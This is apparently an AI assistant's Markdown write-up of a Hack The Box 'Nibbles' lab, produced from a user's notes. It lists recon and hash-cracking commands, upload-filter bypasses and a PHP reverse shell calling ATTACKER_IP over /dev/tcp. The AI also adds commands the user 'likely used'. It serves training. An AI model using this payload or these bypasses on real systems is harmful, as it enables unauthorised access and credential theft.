Perfect — I turned your Week 10 raw notes into a polished, slightly-expanded **Week 10 Progress Report** in Markdown. It adds clear steps, example commands you likely used, small clarifications, a safety/ethics note, and a short reflection. Paste this into `week10.md` and push it to GitHub.

````markdown
# 🗓️ Week 10 Progress Report

**Note:** I missed the exact date this week because I had to reinstall my VM and sort out some config issues — the joys of lab life. Once my environment was stable, I jumped back into HTB and completed the **Nibbles: Web Footprinting** and **Initial Foothold** exercises. This module felt very real-world and taught me a lot about end-to-end web pentesting.

---

## 🔎 Overview — What I did this week
- Completed the **Nibbles** web footprinting lab: full info-gathering → exploitation → initial foothold.  
- Practiced reconnaissance (WhatWeb, Nmap), directory discovery (Gobuster), credential harvesting (CeWL + hash cracking), and web-based file upload exploitation to get a reverse shell.  
- Gained a shell on the target via a PHP webshell and a Netcat listener on my attacking VM.

---

## 🧭 Recon & Enumeration (information gathering)
Workflow and useful commands I ran during the recon phase:

- Identify web server and technologies:
```bash
whatweb https://target-url
````

* Scan for open ports & services:

```bash
nmap -sS -sV -p- target-ip
# or for a focused web scan:
nmap -sV -p 80,443 target-ip
```

* Discover hidden directories and files:

```bash
gobuster dir -u https://target-url -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50
```

What I looked for:

* Server software & version strings (for known CVEs or behaviors).
* `robots.txt` entries and any admin or staging directories.
* Upload forms, image upload endpoints, or other input points.

---

## 🧩 Credential discovery & cracking

During enumeration we found a username (and a hashed password) in one of the discovered files. My process:

* Generate a targeted wordlist from the web content / site words:

```bash
cewl -w site-words.txt https://target-url
```

* Use the generated wordlist with hash-cracking tools (John the Ripper / Hashcat). Example with John:

```bash
john --wordlist=site-words.txt --format=raw-md5 hashfile.txt
```

* Once cracked, test credentials (e.g., login to FTP or web app) and confirm valid access.

**Note:** Always keep hashes and cracked credentials confined to your lab environment — never reuse them on external targets.

---

## 🐚 Initial Foothold — Upload & Reverse Shell

After reconnaissance we found an image upload facility. The attack flow:

1. Create a PHP reverse shell payload (in a lab-safe PHP webshell file):

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>
```

2. Upload the PHP file via the web upload form (sometimes need to bypass filters by using double extensions like `shell.php.jpg`, or by tampering content-type, depending on the lab).

3. Start a Netcat listener on my attacking VM:

```bash
nc -lvnp 4444
```

4. Trigger the uploaded PHP file by browsing to its URL (or via a direct request). When executed, the PHP script connects back to my listener — giving me a remote shell.

5. Upgrade the shell to a TTY for easier interaction:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo
# press Ctrl-Z then run `fg` to get an interactive shell
```

---

## 🔐 Post-exploitation basics I practiced

Once the shell was obtained I performed basic post-exploitation enumeration:

* Check current user & local permissions:

```bash
whoami
id
uname -a
```

* Search for interesting files (credentials, config, backups):

```bash
find / -name "*pass*" -type f 2>/dev/null
grep -R "password" /var/www 2>/dev/null
```

* Inspect web directories to see possible pivot points, configs, or additional uploads.

---

## ⚠️ Ethics & Lab Safety Reminder

* All activities were performed on the HTB lab target / my controlled VM environment.
* Never run these techniques against systems you don’t own or have explicit permission to test. Real-world testing requires written authorization (scope, ROE, NDA, etc.).

---

## ✅ Reflection & Lessons Learned

* This module was a great **end-to-end exercise**: recon → enumeration → credential discovery → file upload exploit → reverse shell → post-exploit. It stitched together many discrete techniques into one realistic scenario.
* Practical takeaways:

  * Wordlists extracted from the target (CeWL) are often more effective than generic lists.
  * File upload functionality is a high-value target — learn both bypasses and mitigations.
  * Always prototype payloads in a VM before attempting them in the target environment.
* VM reinstall hiccups cost time this week, but once my lab was back I made solid progress and documented every step.

---

## 🔜 Next steps

* Repeat the full flow on **two more retired HTB boxes** to reinforce muscle memory.
* Write step-by-step writeups (commands, screenshots, lessons learned) and push them to GitHub.
* Start a short notes file summarizing common upload bypass techniques and safe payload testing tips.

> *“Real learning happens when you stitch tiny wins into a complete workflow.”* — feeling motivated for Week 11

